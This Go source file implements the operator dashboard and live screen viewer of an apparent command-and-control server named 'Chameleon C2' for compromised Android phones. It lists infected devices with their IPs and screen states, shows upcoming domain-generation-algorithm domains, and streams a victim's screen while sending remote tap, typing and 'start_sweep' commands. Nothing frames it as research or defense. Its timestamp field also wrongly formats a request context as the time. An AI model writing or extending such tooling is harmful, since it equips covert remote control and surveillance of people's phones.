package server

import (
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/your-org/chameleon-c2/internal/dga"
	"github.com/your-org/chameleon-c2/internal/types"
)

var dashboardTemplate = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Chameleon C2</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
.container { max-width: 1200px; margin: 0 auto; }
h1 { font-size: 24px; margin-bottom: 20px; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
.stats { display: flex; gap: 20px; margin-bottom: 20px; }
.stat-box { background: #1a1a1a; border: 1px solid #00ff41; padding: 15px; flex: 1; }
.stat-box h3 { font-size: 12px; color: #00cc33; margin-bottom: 5px; }
.stat-box .value { font-size: 28px; }
table { width: 100%; border-collapse: collapse; margin-top: 10px; }
th, td { text-align: left; padding: 8px 12px; border-bottom: 1px solid #1a1a1a; font-size: 13px; }
th { color: #00cc33; font-size: 11px; text-transform: uppercase; }
tr:hover { background: #1a1a1a; }
.status-online { color: #00ff41; }
.status-offline { color: #666; }
.screen-on { color: #00ff41; }
.screen-off { color: #ffcc00; }
.screen-locked { color: #ff6600; }
.screen-unknown { color: #666; }
.dga-info { margin-top: 20px; padding: 10px; background: #1a1a1a; font-size: 12px; color: #00cc33; }
a { color: #00ff41; text-decoration: none; }
a:hover { text-decoration: underline; }
.nav { margin-bottom: 20px; }
.nav a { margin-right: 15px; font-size: 14px; }
.empty { text-align: center; padding: 40px; color: #666; }
.refresh { margin-bottom: 10px; font-size: 12px; color: #666; }
.btn-stream { color: #00ccff; font-weight: bold; }
</style>
</head>
<body>
<div class="container">
<h1>Chameleon C2 — Command & Control</h1>

<div class="nav">
<a href="/">Dashboard</a>
<a href="/api/devices">API: Devices</a>
<a href="/api/stats">API: Stats</a>
<a href="/api/health">API: Health</a>
</div>

<div class="stats">
<div class="stat-box"><h3>Total Devices</h3><div class="value">{{.TotalDevices}}</div></div>
<div class="stat-box"><h3>Connected Now</h3><div class="value">{{.ConnectedNow}}</div></div>
<div class="stat-box"><h3>Online</h3><div class="value">{{.Online}}</div></div>
<div class="stat-box"><h3>Offline</h3><div class="value">{{.Offline}}</div></div>
</div>

<div class="refresh">Last refreshed: {{.Time}} | DGA today: {{.DGAToday}}</div>

{{if .Devices}}
<table>
<thead>
<tr><th>Device ID</th><th>Name</th><th>Model</th><th>Android</th><th>Screen</th><th>IP</th><th>Status</th><th>Last Seen</th><th>Action</th></tr>
</thead>
<tbody>
{{range .Devices}}
<tr>
<td>{{.DeviceID}}</td>
<td>{{.DeviceName}}</td>
<td>{{.Manufacturer}} {{.Model}}</td>
<td>{{.AndroidVersion}} (API {{.APiLevel}})</td>
<td class="screen-{{.ScreenState}}">{{.ScreenState}}</td>
<td>{{.IPAddress}}</td>
<td class="status-{{.Status}}">{{.Status}}</td>
<td>{{.LastSeen.Format "Jan 02 15:04:05"}}</td>
<td><a href="/api/devices/{{.DeviceID}}">View</a> | <a href="/viewer?device={{.DeviceID}}" class="btn-stream" target="_blank">Stream</a></td>
</tr>
{{end}}
</tbody>
</table>
{{else}}
<div class="empty">No devices registered yet. Waiting for payload connections...</div>
{{end}}

<div class="dga-info">
DGA Domains (next 7 days):<br>
{{range .DGADomains}}&nbsp;&nbsp;{{.}}<br>{{end}}
</div>

<p style="margin-top: 20px; font-size: 12px; color: #666;">
Send commands via: <code>POST /api/command {"device_id":"...","command":"start_sweep","params":{"duration":300,"targets":["all"]}}</code>
</p>
</div>
<script>
setTimeout(function(){ location.reload(); }, 15000);
</script>
</body>
</html>
`

var viewerTemplate = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Stream — {{.DeviceID}}</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; text-align: center; }
h1 { font-size: 18px; margin-bottom: 10px; }
#canvas { border: 1px solid #00ff41; max-width: 100%; image-rendering: pixelated; }
.controls { margin: 10px 0; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
.controls button, .controls select, .controls input { background: #1a1a1a; border: 1px solid #00ff41; color: #00ff41; padding: 6px 12px; cursor: pointer; }
.controls button:hover { background: #00ff41; color: #0a0a0a; }
.controls input { width: 300px; }
.status { font-size: 12px; color: #666; margin-top: 10px; }
.stream-active { color: #00ff41; font-weight: bold; }
.stream-inactive { color: #ff3333; }
</style>
</head>
<body>
<h1>Streaming: <span id="deviceName">{{.DeviceID}}</span></h1>

<div class="controls">
<button id="btnStream">Start Stream</button>
<select id="selQuality">
<option value="low">Low (320x480)</option>
<option value="medium">Medium (480x720)</option>
<option value="high">High (720x1280)</option>
</select>
<select id="selFps">
<option value="1">1 fps</option>
<option value="2">2 fps</option>
<option value="3">3 fps</option>
<option value="5">5 fps</option>
</select>
<button id="btnTapMode" class="active">Tap Mode</button>
</div>

<div class="controls">
<input id="txtType" placeholder="Type text and press Enter...">
</div>

<canvas id="canvas" width="480" height="854"></canvas>

<div class="status">
<span id="streamStatus" class="stream-inactive">● Disconnected</span>
<span id="frameInfo"></span>
</div>

<script>
const deviceID = "{{.DeviceID}}";
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const statusEl = document.getElementById('streamStatus');
const frameInfo = document.getElementById('frameInfo');
const btnStream = document.getElementById('btnStream');
const btnTapMode = document.getElementById('btnTapMode');
const selQuality = document.getElementById('selQuality');
const selFps = document.getElementById('selFps');
const txtType = document.getElementById('txtType');

let ws = null;
let isStreaming = false;
let tapMode = true;
let frameCount = 0;
let lastFrameTime = 0;

function connectWS() {
    const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
    ws = new WebSocket(protocol + location.host + '/admin/ws');
    
    ws.onopen = function() {
        ws.send(JSON.stringify({type: 'subscribe', device_id: deviceID}));
        statusEl.textContent = '● Connecting...';
        statusEl.className = 'stream-inactive';
    };
    
    ws.onmessage = function(e) {
        if (e.data instanceof Blob) {
            const reader = new FileReader();
            reader.onload = function() {
                const img = new Image();
                img.onload = function() {
                    canvas.width = img.width;
                    canvas.height = img.height;
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                    frameCount++;
                    const now = Date.now();
                    const fps = lastFrameTime ? (1000 / (now - lastFrameTime)).toFixed(1) : '?';
                    lastFrameTime = now;
                    frameInfo.textContent = ' | Frames: ' + frameCount + ' | FPS: ' + fps;
                };
                img.src = reader.result;
            };
            reader.readAsDataURL(e.data);
        } else {
            try {
                const msg = JSON.parse(e.data);
                if (msg.type === 'subscribed') {
                    statusEl.textContent = '● Subscribed';
                    statusEl.className = 'stream-active';
                }
            } catch(err) {}
        }
    };
    
    ws.onclose = function() {
        statusEl.textContent = '● Disconnected';
        statusEl.className = 'stream-inactive';
        if (isStreaming) setTimeout(connectWS, 3000);
    };
    
    ws.onerror = function() {
        ws.close();
    };
}

function toggleStream() {
    const quality = selQuality.value;
    const fps = parseInt(selFps.value);
    isStreaming = !isStreaming;
    if (isStreaming) {
        btnStream.textContent = 'Stop Stream';
        statusEl.textContent = '● Starting...';
        statusEl.className = 'stream-active';
        fetch('/api/command', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                device_id: deviceID,
                command: 'start_stream',
                params: {quality: quality, fps: fps}
            })
        });
        if (!ws || ws.readyState !== WebSocket.OPEN) connectWS();
    } else {
        btnStream.textContent = 'Start Stream';
        statusEl.textContent = '● Stopped';
        fetch('/api/command', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                device_id: deviceID,
                command: 'stop_stream'
            })
        });
        if (ws) ws.close();
    }
}

function sendTap(x, y) {
    fetch('/api/command', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            device_id: deviceID,
            command: 'tap',
            params: {x: x, y: y}
        })
    });
}

canvas.addEventListener('click', function(e) {
    if (!isStreaming) return;
    const rect = canvas.getBoundingClientRect();
    const scaleX = canvas.width / rect.width;
    const scaleY = canvas.height / rect.height;
    const x = Math.round((e.clientX - rect.left) * scaleX);
    const y = Math.round((e.clientY - rect.top) * scaleY);
    sendTap(x, y);
});

txtType.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && txtType.value.trim()) {
        fetch('/api/command', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                device_id: deviceID,
                command: 'type',
                params: {text: txtType.value}
            })
        });
        txtType.value = '';
    }
});

btnStream.addEventListener('click', toggleStream);
connectWS();
</script>
</body>
</html>
`

type dashboardData struct {
	TotalDevices  int
	ConnectedNow  int
	Online        int
	Offline       int
	Devices       []types.Device
	DGAToday      string
	DGADomains    []string
	Time          string
}

type viewerData struct {
	DeviceID string
}

func (s *Server) handleDashboard(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}

	devices, err := s.db.ListDevices()
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	if devices == nil {
		devices = []types.Device{}
	}

	connected := s.hub.ConnectedDeviceIDs()
	connectedSet := make(map[string]bool)
	for _, id := range connected {
		connectedSet[id] = true
	}

	online := 0
	offline := 0
	for i := range devices {
		if connectedSet[devices[i].DeviceID] {
			devices[i].Status = "online"
			online++
		} else if devices[i].Status == "online" {
			online++
		} else {
			offline++
		}
	}

	tmpl, err := template.New("dashboard").Parse(dashboardTemplate)
	if err != nil {
		log.Printf("template parse error: %v", err)
		http.Error(w, "template error", 500)
		return
	}

	data := dashboardData{
		TotalDevices: len(devices),
		ConnectedNow: s.hub.ConnectedCount(),
		Online:       online,
		Offline:      offline,
		Devices:      devices,
		DGAToday:     dga.Today(),
		DGADomains:   dga.GenerateDomains(7),
		Time:         fmt.Sprintf("%s UTC", r.Context()),
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	tmpl.Execute(w, data)
}

func (s *Server) handleViewer(w http.ResponseWriter, r *http.Request) {
	deviceID := r.URL.Query().Get("device")
	if deviceID == "" {
		http.Error(w, "missing device parameter", 400)
		return
	}

	tmpl, err := template.New("viewer").Parse(viewerTemplate)
	if err != nil {
		log.Printf("viewer template parse error: %v", err)
		http.Error(w, "template error", 500)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	tmpl.Execute(w, viewerData{DeviceID: deviceID})
}
